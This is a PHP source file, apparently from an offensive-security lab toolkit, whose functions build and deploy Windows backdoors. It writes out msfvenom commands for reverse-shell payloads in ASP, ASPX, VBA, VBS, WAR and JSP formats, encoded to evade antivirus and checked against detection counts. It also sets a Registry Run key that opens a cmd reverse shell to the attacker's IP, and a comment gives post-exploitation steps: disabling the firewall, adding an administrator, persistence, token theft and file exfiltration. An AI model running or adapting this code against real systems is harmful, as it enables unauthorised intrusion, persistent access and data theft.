        $this->file_file2virus2vt(); // 0 / 57
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
 */   
    
    public function backdoor_win_persistance() {
        $this->ssTitre(__FUNCTION__);
        $xp = new VM($this->target_vmx_name); // xp3
        $xp->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd($this->target_ip, "reg add \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /f /v \"system\" /t REG_SZ /d \"$this->vm_tmp_win\\$this->file_ext $this->attacker_ip $this->attacker_port -e cmd\"");
        $this->pause();
        /*
         *
         * reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         * # Allows incoming terminal service connections
         *
         * reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
         * # Disables blocking incoming Terminal service connections
         *
         * Netsh firewall set opmode enable
         * # Enable Firewall on Victim
         *
         * Netsh firewall set opmode disable
         * # Disable Firewall on Victim
         *
         * net user [USERNAME] [PASSWORD]
         * # Change password for the user
         *
         * # Or create you own user
         *
         * net user [USERNAME] [PASSWORD] /add
         *
         * net localgroup [GROUP] [USERNAME] /add
         * # In [GROUP] you could use "administrators" and [USERNAME] is the user you just created
         *
         * net accounts /maxpwage:[days] | unlimited
         * # Examples: net accounts /maxpwage:6
         * # or: net accounts /maxpwage:unlimited
         *
         * rdesktop [IP]:[port] -u "[USERNAME]"
         *
         * run metsvc (set backdoor for next time you want in)
         *
         * (OR THIS)
         *
         * run persistence -r [YOUR IP ADRESS INT./EXT.] -p [YOUR PORT] -A -X -i 300
         * # 300 tells it to send request for connection every 300 sec. "run persistence -h" for more info
         *
         * getuid
         * # If = "NT AUTHORITY\SYSTEM" do this else go to "use priv":
         *
         * ps
         * # Find PID on explorer.exe
         *
         * steal_token [NUMBER - PID on explorer]
         * # From what i know it grants you the same rights as the user running that process
         *
         * use priv
         * get system
         *
         * search -f *.jpg
         * # Finding all JPG files on the system
         *
         * search -d "[DRIVE:\\FOLDER\\FOLDER]" -f *.jpg
         * # Finding all JPG filen i a specific folder
         *
         * searct -f test.txt
         * # Find a specific file on the whole system
         *
         * upload "/root/test 2.txt" "DRIVE:\\FOLDER\\FOLDER\\test 2.txt"
         * # Example: upload "/root/test 2.txt" "C:\\test\\test1\\test 2.txt"
         *
         * download "DRIVE:\\FOLDER\\FOLDER\\test 2.txt" "/root/test 2.txt"
         * # Example: download "C:\\test\\test1\\test 2.txt" "/root/test 2.txt"
         */
    }
    
    public function backdoor_win_injected_into_pid() {
        $this->ssTitre(__FUNCTION__);
        // checksec.sh --proc
        // checksec.sh --proc-all
        // checksec.sh --proc-libs
        // flame inject code into iexplorer.exe to connect to windowsupdate.microsoft.com to first test the connection
        
        $this->titre("Exemple Injected into other Process With Metasploit" );
        $this->cmd($this->attacker_ip, "msfvenom --payload  windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port AutoRunScript=launch_and_migrate.rb X > $this->file_path" );
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;set AutoRunScript launch_and_migrate.rb;run;\" ");
        $this->cmd($this->attacker_ip, "ps ; migrate <ID_explorer.exe>" );
        $this->pause();
        // cmd($this->attacker_ip,"run vnc"); // rajouter AutoRunScript /opt/metasploit/apps/pro/msf3/scripts/meterpreter/vnc.rb
    }
    
    // #############################################################################
    
    
    
    
    function backdoor_win_msf2c_win_shell_cmd($cmd, $badchars) {
        $this->ssTitre( "SHELLCODE C");
        
        $file_output = new FILE("shell_cmd.h");
        // if(!file_exists("$this->dir_tmp/$file_output")) // --encoder x86/shikata_ga_nai --iterations 1
        $this->requette( "msfvenom --payload windows/exec cmd=\"$cmd\" -b \"\\x00$badchars\"  --arch x86 --platform windows  --format c > $file_output->file_path ");
        $check = file_get_contents("$file_output->file_path");
        if (empty($check )) {
            $this->important( "Echec msfvenom C Retry in 3 secondes");
            sleep(3 );
            return $this->backdoor_win_msf2c_win_shell_cmd( $cmd, $badchars );
        }
        $hex = $file_output->c2hex("$file_output->file_path");
        $flag = $this->payload4norme($hex, $badchars );
        if ($flag == false) {
            $this->important( "Echec Obstacle");
            return $this->backdoor_win_msf2c_win_shell_cmd( $cmd, $badchars );
        }
        return $hex;
    }
    
    public function backdoor_win_msf2asp() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port   --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format asp -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2aspx() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format aspx -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2vba() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format vba -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2vbs() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format vbs -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2war() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload java/jsp_shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format war -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("$this->target_ip","java -jar $this->file_path ");
        return $this;
    }
    
    
    
    public function backdoor_win_bat() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "cd /opt/TheFatRat; sudo ./fatrat > 06 > 01 > 02 > $this->file_path";
        
        if (!file_exists("/opt/TheFatRat/fatrat")) $this->install_malware_thefatrat();
        $this->cmd($this->attacker_ip,$query);
        $this->pause();
        $this->requette("sudo cp -v /opt/TheFatRat/output/$this->file_ext $this->file_path");
        if (!file_exists($this->file_path ))  return $this->backdoor_win_bat();
        
        $this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );
        $this->file_file2virus2vt();
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
       // $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2jsp() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload java/jsp_shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format raw -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    
    
    
    
}
?>